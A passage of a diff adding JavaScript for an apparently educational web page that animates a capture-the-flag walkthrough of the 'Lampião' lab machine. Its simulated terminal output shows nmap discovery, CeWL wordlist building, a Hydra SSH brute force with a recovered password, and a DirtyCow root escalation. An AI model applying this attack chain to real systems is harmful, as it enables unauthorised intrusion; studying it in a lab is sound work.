+  ctx.clearRect(0, 0, w, h);
+  particles.forEach(p => { p.update(); p.draw(); });
+  drawConnections();
+  requestAnimationFrame(animateCanvas);
+}
+animateCanvas();
+
+// ---- ATTACK FLOW EXPAND ----
+document.querySelectorAll('.flow-node').forEach(node => {
+  node.addEventListener('click', function() {
+    this.classList.toggle('expanded');
+    const detail = this.querySelector('.node-detail');
+    if (this.classList.contains('expanded')) {
+      detail.textContent = this.getAttribute('data-detail') || '';
+    } else {
+      detail.textContent = '';
+    }
+  });
+});
+
+// ---- SIMULATIONS ----
+function typeSim(containerId, lines, speed = 30) {
+  const out = document.getElementById(containerId);
+  out.innerHTML = '';
+  let lineIdx = 0, charIdx = 0;
+  function type() {
+    if (lineIdx >= lines.length) return;
+    const currentLine = lines[lineIdx];
+    if (charIdx < currentLine.text.length) {
+      const span = document.createElement('span');
+      span.className = currentLine.cls || '';
+      out.innerHTML += currentLine.text[charIdx];
+      charIdx++;
+      setTimeout(type, speed);
+    } else {
+      out.innerHTML += '\n';
+      lineIdx++;
+      charIdx = 0;
+      setTimeout(type, speed * 2);
+    }
+  }
+  type();
+}
+
+function runSimNmap() {
+  const btn = document.querySelector('#simNmap .sim-btn');
+  btn.disabled = true;
+  typeSim('simNmapOut', [
+    {text: 'kali@attacker:~$ nmap -sn 192.168.56.0/24', cls: 'sim-prompt'},
+    {text: 'Starting Nmap 7.94 (https://nmap.org)', cls: ''},
+    {text: 'Nmap scan report for 192.168.56.1', cls: ''},
+    {text: 'Host is up (0.0008s latency).', cls: ''},
+    {text: 'Nmap scan report for 192.168.56.103', cls: 'sim-success'},
+    {text: 'Host is up (0.0012s latency).', cls: 'sim-success'},
+    {text: 'Done: 256 hosts scanned, 2 up', cls: ''},
+    {text: '[+] Target: 192.168.56.103', cls: 'sim-highlight'}
+  ]);
+  setTimeout(() => { btn.disabled = false; }, 6000);
+}
+function runSimHydra() {
+  const btn = document.querySelector('#simHydra .sim-btn');
+  btn.disabled = true;
+  typeSim('simHydraOut', [
+    {text: 'kali@attacker:~$ hydra -L usernames.txt -P pass.txt -e nsr -f -t 4 ssh://192.168.56.103', cls: 'sim-prompt'},
+    {text: 'Hydra v9.5 (c) 2023 by van Hauser/THC', cls: ''},
+    {text: '[DATA] max 4 tasks, 2 targets', cls: ''},
+    {text: '[22][ssh] host: 192.168.56.103', cls: ''},
+    {text: '  login: tiago   password: Virgulino', cls: 'sim-highlight'},
+    {text: '[STATUS] attack finished (1 valid password found)', cls: 'sim-success'}
+  ]);
+  setTimeout(() => { btn.disabled = false; }, 6000);
+}
+function runSimCewl() {
+  const btn = document.querySelector('#simCewl .sim-btn');
+  btn.disabled = true;
+  typeSim('simCewlOut', [
+    {text: 'kali@attacker:~$ cewl http://192.168.56.103:1898/?q=node/1 -w pass.txt', cls: 'sim-prompt'},
+    {text: 'CeWL 6.1 (Max Length) Open Source Tool', cls: ''},
+    {text: 'Crawling: http://192.168.56.103:1898/?q=node/1', cls: ''},
+    {text: 'Found: Lampião, Virgulino, tiago, Eder, ...', cls: ''},
+    {text: 'Words extracted: 127', cls: 'sim-info'},
+    {text: 'Wordlist saved to: pass.txt', cls: 'sim-success'}
+  ]);
+  setTimeout(() => { btn.disabled = false; }, 5000);
+}
+function runSimSsh() {
+  const btn = document.querySelector('#simSsh .sim-btn');
+  btn.disabled = true;
+  typeSim('simSshOut', [
+    {text: 'kali@attacker:~$ ssh tiago@192.168.56.103', cls: 'sim-prompt'},
+    {text: 'tiago@192.168.56.103\'s password: [Virgulino]', cls: ''},
+    {text: 'Welcome to Ubuntu 14.04 LTS', cls: 'sim-success'},
+    {text: 'tiago@Lampiao:~$ whoami', cls: 'sim-prompt'},
+    {text: 'tiago', cls: 'sim-highlight'},
+    {text: '[+] SSH session established as tiago', cls: 'sim-success'}
+  ]);
+  setTimeout(() => { btn.disabled = false; }, 5000);
+}
+function runSimDc() {
+  const btn = document.querySelector('#simDc .sim-btn');
+  btn.disabled = true;
+  typeSim('simDcOut', [
+    {text: 'tiago@Lampiao:/tmp$ ./dirtycow', cls: 'sim-prompt'},
+    {text: 'DirtyCow root privilege escalation', cls: ''},
+    {text: 'Backing up /etc/passwd to /tmp/passwd.bak', cls: ''},
+    {text: 'Creating root user: firefart', cls: 'sim-highlight'},
+    {text: 'Password: [random_generated]', cls: 'sim-highlight'},
+    {text: '[+] Exploit successful — new root user created', cls: 'sim-success'}
+  ]);
+  setTimeout(() => { btn.disabled = false; }, 5000);
+}
+function runSimEnum() {
+  const btn = document.querySelector('#simEnum .sim-btn');
+  btn.disabled = true;
+  typeSim('simEnumOut', [
+    {text: 'tiago@Lampiao:~$ uname -a', cls: 'sim-prompt'},
+    {text: 'Linux Lampiao 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 2014 x86_64 GNU/Linux', cls: ''},
+    {text: 'tiago@Lampiao:~$ id', cls: 'sim-prompt'},
+    {text: 'uid=1000(tiago) gid=1000(tiago) groups=1000(tiago)', cls: ''},
+    {text: 'tiago@Lampiao:~$ cat /etc/*release', cls: 'sim-prompt'},
+    {text: 'DISTRIB_DESCRIPTION="Ubuntu 14.04 LTS"', cls: ''},
+    {text: '[+] Kernel: 3.13.0-32-generic | Arch: x86_64 | OS: Ubuntu 14.04', cls: 'sim-info'}
+  ]);
+  setTimeout(() => { btn.disabled = false; }, 5000);
+}
+
+// ---- OBSERVER FOR FLOW NODE ANIMATION ----
+const flowObserver = new IntersectionObserver((entries) => {
+  entries.forEach(entry => {
+    if (entry.isIntersecting) {
+      entry.target.style.opacity = '1';
+      entry.target.style.transform = 'translateY(0)';
+    }
+  });
+}, { threshold: 0.3 });
+document.querySelectorAll('.flow-node, .chain .link').forEach(el => {
+  el.style.opacity = '0';
+  el.style.transform = 'translateY(20px)';
+  el.style.transition = 'all 0.5s ease';
+  flowObserver.observe(el);
+});
+
+// Chain staggered reveal
+document.querySelectorAll('.chain .link').forEach((el, i) => {
+  el.style.transitionDelay = (i * 0.1) + 's';
+});
+document.querySelectorAll('.attack-flow .flow-node').forEach((el, i) => {
+  el.style.transitionDelay = (i * 0.08) + 's';
+});
+</script>
+</body>
+</html>
